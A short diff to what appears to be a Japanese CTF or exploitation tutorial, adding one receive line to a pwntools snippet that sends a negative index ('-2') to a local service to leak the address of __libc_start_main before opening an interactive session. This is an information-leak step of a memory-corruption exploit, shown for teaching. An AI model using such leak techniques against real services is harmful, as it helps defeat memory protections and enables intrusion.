@@ -1116,6 +1116,7 @@ conn = remote("localhost", 5000)
 
 conn.sendafter("index: ", "-2")
 libc_start_main = conn.recvline() #改行まで読み込み
+conn.recvuntil('\n')
 
 conn.interactive()
 ```
